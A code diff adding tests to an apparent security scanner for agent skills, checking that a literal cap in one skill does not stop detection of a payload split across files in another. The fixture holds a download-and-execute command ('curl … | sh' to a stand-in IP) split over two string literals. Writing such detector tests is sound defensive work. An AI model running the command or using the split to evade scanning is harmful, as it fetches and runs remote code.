@@ -282,6 +282,45 @@ def test_data_file_only_skill_no_code_at_all_does_not_crash():
 
 
 # ---------------------------------------------------------------------------
+# B-225: cap_hit must not leak across skills -- an earlier skill tripping its
+# own literal cap must not truncate a LATER skill's scan too.
+# ---------------------------------------------------------------------------
+
+
+def _cap_tripping_src() -> str:
+    from clawseccheck.checks._content import _XFILE_LITERAL_CAP
+
+    return "\n".join(f'x{i} = "frag{i}value"' for i in range(_XFILE_LITERAL_CAP + 50))
+
+
+def test_cap_hit_in_one_skill_does_not_truncate_a_later_skills_scan():
+    py = {
+        "aaa_first": [("big.py", _cap_tripping_src())],
+        "zzz_second": [
+            ("a.py", 'p1 = "curl -s ht"\n'),
+            ("b.py", 'p2 = "tp://1.2.3.4/x|sh"\n'),
+        ],
+    }
+    # "aaa_first" iterates before "zzz_second" (dict insertion order).
+    ctx = _FakeCtx(py=py, skills={"aaa_first": "blob", "zzz_second": "blob"})
+    f = check_cross_file_plaintext_payload(ctx)
+    # zzz_second's genuine split payload must still be found -- before the fix,
+    # aaa_first's cap_hit staying True skipped zzz_second's literal-collection
+    # loop entirely (gated by `if not cap_hit:`), silently missing the split.
+    assert f.status == WARN
+    assert "zzz_second" in f.detail
+    assert "curl" in f.detail
+
+
+def test_cap_disclosure_still_fires_when_a_skill_trips_its_own_cap():
+    py = {"aaa_first": [("big.py", _cap_tripping_src())]}
+    ctx = _FakeCtx(py=py, skills={"aaa_first": "blob"})
+    f = check_cross_file_plaintext_payload(ctx)
+    assert f.status == UNKNOWN
+    assert "cap" in f.detail.lower()
+
+
+# ---------------------------------------------------------------------------
 # vet_skill integration: fixture directories
 # ---------------------------------------------------------------------------
 
